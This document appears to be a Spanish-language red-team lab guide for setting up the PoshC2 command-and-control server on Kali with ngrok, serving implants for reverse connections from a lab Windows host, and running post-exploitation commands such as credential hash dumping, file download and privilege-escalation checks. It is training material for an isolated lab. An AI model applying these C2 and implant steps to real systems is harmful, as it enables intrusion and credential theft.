## Lab3: C2 - PoshC2
![image](https://user-images.githubusercontent.com/50930193/180666195-537fb36c-88bf-4926-b0d4-fc18e36b06ab.png)

**Descripción**

El laboratorio tiene por objetivo, establecer un Centro de Comando y Control (C2) basado en PoshC2, ejecutar comandos de obtención de información post explotación 

- Para el desarrollo del laboratorio se requiere que el participante instale el PoshC2 siguiendo las indicaciones o desde la página oficial: https://poshc2.readthedocs.io/en/latest/
- Como víctima, se debe crear una instancia en AWS con sistema operativo Windows7 o Windows Server 2012R2 y estar dentro del dominio RTOOS.NET. **La instancia debe estar conectado a la vpn pública.**


### SOLUCIÓN:

1. **Pre-requisito** (Tener Kali actualizado) si no se podrían presentar errores de dependencias:

   ```
   # Instalación en Kali 
   
   $ sudo apt update && sudo apt -y full-upgrade -y
   ```

2. **Instalación** Instalar PoshC2 en el equipo que ejecuta Kali Linux mediante la siguiente línea de comandos :

   ```
   # Instalación en Kali (disponible desde el 14 de Julio del 2022): 
   $ sudo apt install poshc2
   
   # Instalación de manera local: 
   $ curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash

   # Instalación en docker:
   $ apt install docker docker.io
   ```
  ![image](https://user-images.githubusercontent.com/50930193/180670874-a44f63a7-866f-4423-8871-8089d206bdcc.png)
  ...
  ![image](https://user-images.githubusercontent.com/50930193/180671002-ea668940-1e65-4878-aef9-41d2ce4329e6.png)

  
- Instalar las dependiencias y configurar lo necesario para ejecutar el C2
- Cuando todo esté instalado correctamente, confgurar el servidor C2, considerando ngrok como proxy o tunnel 

3. **Configuración** Utilice, los siguientes comandos  para configuración:

    ```
    # Creación de proyectos:
    $ sudo posh-project -n <nombre_proyecto>
    ```
   ![image](https://user-images.githubusercontent.com/50930193/180668548-0af7946d-b92f-48b5-94b7-d00e3c7d65fc.png)
   
   ```
    # Configuración:
    $ sudo posh-config # se abrirá en el editor por defecto (vim en su mayoria)
    ```
    Dentro de la configuración se cambiaran 2 parametros generalmente:
    ```
    BindPort: -> Puerto de escucha en Kali o bien que apunte a ngrok
    
    PayloadCommsHost -> url de tu maquina escucha (ip de tu kali o tu ngrok).

    KillDate -> Fecha max que quieres que dure el beacon.
    ```
    
    Con kali directamente
    ![image](https://user-images.githubusercontent.com/50930193/180669019-8b67e91d-c694-442d-be1d-ee7a726b4950.png)

    Con ngrok  `$./ngrok http 8080 --scheme=http`
    ![image](https://user-images.githubusercontent.com/50930193/180670322-011c32ee-e8f0-4cad-8122-21db21b883f8.png)



- En una ventana de terminal ejecutar el servidor : 
     ```
     posh-server
     ```
     
- En otra ventana o pestaña de terminal ejecute el cliente o Implant Manager : 
     ```
     posh
     ```
     
  Le solicitará colocar un nombre de usuario.


- Para efectos de este laboratorio, el instructor ejecutará un payload que permitirá desplegar un implante que generará una conexión reversa hacia el PoshC2 Server o el participante puede tener acceso al host victima para realizar la transferncia del implante.

- Una alternativa para la transferencia del payload es utilizar un servidor web creado en la carpeta donde se almacenan los implantes (/opt/PoshC2_Project/payloads) :

```
    python -m SimpleHTTPServer 80
```
  	
- De forma ordenada, el participante deberá comunicar al instructor su dirección IP para que él descargue y ejecute el payload desde la maquina victima. De esta forma, recibirá una conexión reversa en su PoshC2 Server y tendrá su primer implante establecido.

- Otra opción es ejecutar el comando de powershell en base 64.

- En el Implant Handler y en la consola del C2 Server se podrá ver la información del implante que se ha conectado y esta disponible.

- Para interactuar con ese implante desde el Implant Handler, seleccionar el implante por su ID (verifique que sea el que corresponda al mismo que apareció en la consola del C2 Server).

- Ejecute algunos o todos los siguientes comandos además del comando help que le permitirá conocer lo que incluye Posch C2 Server por default :

```
    ls
    pwd
    get-implantworkingdirectory
    cd c:\users\xxxx 
    download-file Tropheo.txt
    get-computerinfo
    get-netstat
    get-pid
    ps
    find-allvulns
    invoke-allchecks
    get-MpPreference
    Get-LocalGroupMember Administrators
    get-hash
    loadmodule SeatBealt.ps1
    seatbelt
```
    
- Antes de culminar, vuelva al primer nivel del Implant Manager para obtener información del C2 Server y un reporte de actividades :

```
    back
    show-serverinfo
    generate-reports
```
    


*============FIN DE DOCUMENTO===============*




